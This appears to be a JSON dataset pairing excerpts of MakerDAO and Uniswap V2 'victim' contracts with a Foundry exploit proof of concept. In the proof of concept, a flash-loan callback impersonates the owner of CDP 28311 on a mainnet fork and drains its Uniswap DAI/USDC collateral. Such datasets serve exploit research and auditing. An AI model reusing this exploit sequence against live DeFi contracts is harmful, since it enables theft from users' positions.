[
  {
    "contract/interface": "IUniv2",
    "source_type": "victim_contract",
    "function_name": "exit",
    "original_code": "    function exit(address usr, uint wad) external note {\n        require(wad <= 2 ** 255, \"GemJoin/overflow\");\n        vat.slip(ilk, msg.sender, -int(wad));\n        require(gem.transfer(usr, wad), \"GemJoin/failed-transfer\");\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "onFlashLoan",
    "original_code": "    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        address urns_address = IMakerManager(maker_cdp_manager).urns(28_311);\n        Urn memory urn = IMakerVat(make_mcd_vat).urns(\n            0x554e495632444149555344432d41000000000000000000000000000000000000, urns_address\n        );\n\n        Ilk memory ilk =\n            IMakerVat(make_mcd_vat).ilks(0x554e495632444149555344432d41000000000000000000000000000000000000);\n\n        int256 dink = 0 - int256(urn.ink);\n        int256 dart = 0 - int256(urn.art);\n\n        uint256 amount_dai = IERC20(dai).balanceOf(address(this));\n        IERC20(dai).approve(maker_mcd_join_dai, amount_dai);\n\n        IMakerManager(maker_mcd_join_dai).join(urns_address, amount_dai);\n\n        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9); // borrow the authority of cdp 28311 (assigned before)\n        IMakerManager(maker_cdp_manager).frob(28_311, dink, dart);\n        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9);\n        IMakerManager(maker_cdp_manager).flux(28_311, address(this), urn.ink);\n        IUniv2(univ2).exit(address(this), urn.ink);\n\n        IERC20(univ2_token).transfer(univ2_token, urn.ink);\n        (uint256 amount0, uint256 amount1) = IUniv2Token(univ2_token).burn(address(this));\n\n        IERC20(circle).approve(allower, type(uint256).max);\n        Mcd(mcd).sellGem(address(this), 3_580_348_695_472);\n        IERC20(dai).approve(maker, type(uint256).max);\n        return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15_354_438 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Begin] Attacker Circle before exploit\", IERC20(circle).balanceOf(address(this)), 6\n        );\n        uint256 amount = 7_313_820_511_466_897_574_539_490;\n        bytes memory data =\n            \"0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000\";\n        IMakerPool(maker).flashLoan(address(this), dai, amount, data);\n        emit log_named_decimal_uint(\"[End] Attacker Circle after exploit\", IERC20(circle).balanceOf(address(this)), 6);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerPool",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "    function flashLoan(\n        IERC3156FlashBorrower receiver,\n        address token,\n        uint256 amount,\n        bytes calldata data\n    ) external returns (bool);\n}\n\n////// src/interface/IVatDaiFlashBorrower.sol\n// Copyright (C) 2021 Dai Foundation\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU Affero General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU Affero General Public License for more details.\n//\n// You should have received a copy of the GNU Affero General Public License\n// along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniv2Token",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(address to) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerManager",
    "source_type": "victim_contract",
    "function_name": "cdpAllow",
    "original_code": "    function cdpAllow(\n        uint cdp,\n        address usr,\n        uint ok\n    ) public cdpAllowed(cdp) {\n        cdpCan[owns[cdp]][cdp][usr] = ok;\n    }\n\n    // Allow/disallow a usr address to quit to the the sender urn.\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerManager",
    "source_type": "victim_contract",
    "function_name": "flux",
    "original_code": "    function flux(bytes32 ilk, address src, address dst, uint256 wad) external note {\n        require(wish(src, msg.sender), \"Vat/not-allowed\");\n        gem[ilk][src] = sub(gem[ilk][src], wad);\n        gem[ilk][dst] = add(gem[ilk][dst], wad);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerManager",
    "source_type": "victim_contract",
    "function_name": "frob",
    "original_code": "    function frob(bytes32 i, address u, address v, address w, int dink, int dart) external note {\n        // system is live\n        require(live == 1, \"Vat/not-live\");\n\n        Urn memory urn = urns[i][u];\n        Ilk memory ilk = ilks[i];\n        // ilk has been initialised\n        require(ilk.rate != 0, \"Vat/ilk-not-init\");\n\n        urn.ink = add(urn.ink, dink);\n        urn.art = add(urn.art, dart);\n        ilk.Art = add(ilk.Art, dart);\n\n        int dtab = mul(ilk.rate, dart);\n        uint tab = mul(ilk.rate, urn.art);\n        debt     = add(debt, dtab);\n\n        // either debt has decreased, or debt ceilings are not exceeded\n        require(either(dart <= 0, both(mul(ilk.Art, ilk.rate) <= ilk.line, debt <= Line)), \"Vat/ceiling-exceeded\");\n        // urn is either less risky than before, or it is safe\n        require(either(both(dart <= 0, dink >= 0), tab <= mul(urn.ink, ilk.spot)), \"Vat/not-safe\");\n\n        // urn is either more safe, or the owner consents\n        require(either(both(dart <= 0, dink >= 0), wish(u, msg.sender)), \"Vat/not-allowed-u\");\n        // collateral src consents\n        require(either(dink <= 0, wish(v, msg.sender)), \"Vat/not-allowed-v\");\n        // debt dst consents\n        require(either(dart >= 0, wish(w, msg.sender)), \"Vat/not-allowed-w\");\n\n        // urn has no debt, or a non-dusty amount\n        require(either(urn.art == 0, tab >= ilk.dust), \"Vat/dust\");\n\n        gem[i][v] = sub(gem[i][v], dink);\n        dai[w]    = add(dai[w],    dtab);\n\n        urns[i][u] = urn;\n        ilks[i]    = ilk;\n    }\n    // --- CDP Fungibility ---\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerManager",
    "source_type": "victim_contract",
    "function_name": "join",
    "original_code": "    function join(address usr, uint wad) external note {\n        require(live == 1, \"GemJoin/not-live\");\n        require(int(wad) >= 0, \"GemJoin/overflow\");\n        vat.slip(ilk, usr, int(wad));\n        require(gem.transferFrom(msg.sender, address(this), wad), \"GemJoin/failed-transfer\");\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerManager",
    "source_type": "victim_contract",
    "function_name": "open",
    "original_code": "    function open(\n        bytes32 ilk,\n        address usr\n    ) public note returns (uint) {\n        require(usr != address(0), \"usr-address-0\");\n\n        cdpi = add(cdpi, 1);\n        urns[cdpi] = address(new UrnHandler(vat));\n        owns[cdpi] = usr;\n        ilks[cdpi] = ilk;\n\n        // Add new CDP to double linked list and pointers\n        if (first[usr] == 0) {\n            first[usr] = cdpi;\n        }\n        if (last[usr] != 0) {\n            list[cdpi].prev = last[usr];\n            list[last[usr]].next = cdpi;\n        }\n        last[usr] = cdpi;\n        count[usr] = add(count[usr], 1);\n\n        emit NewCdp(msg.sender, usr, cdpi);\n        return cdpi;\n    }\n\n    // Give the cdp ownership to a dst address.\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerManager",
    "source_type": "victim_contract",
    "function_name": "urns",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMakerVat",
    "source_type": "victim_contract",
    "function_name": "heal",
    "original_code": "    function heal(uint rad) external note {\n        address u = msg.sender;\n        sin[u] = sub(sin[u], rad);\n        dai[u] = sub(dai[u], rad);\n        vice   = sub(vice,   rad);\n        debt   = sub(debt,   rad);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerVat",
    "source_type": "victim_contract",
    "function_name": "hope",
    "original_code": "    function hope(address usr) external auth {\n        vat.hope(usr);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IMakerVat",
    "source_type": "victim_contract",
    "function_name": "ilks",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Mcd",
    "source_type": "victim_contract",
    "function_name": "sellGem",
    "original_code": "    function sellGem(address usr, uint256 gemAmt) external {\n        uint256 gemAmt18 = mul(gemAmt, to18ConversionFactor);\n        uint256 fee = mul(gemAmt18, tin) / WAD;\n        uint256 daiAmt = sub(gemAmt18, fee);\n        gemJoin.join(address(this), gemAmt, msg.sender);\n        vat.frob(ilk, address(this), address(this), address(this), int256(gemAmt18), int256(gemAmt18));\n        vat.move(address(this), vow, mul(fee, RAY));\n        daiJoin.exit(usr, daiAmt);\n\n        emit SellGem(usr, gemAmt, fee);\n    }\n\n",
    "description": ""
  }
]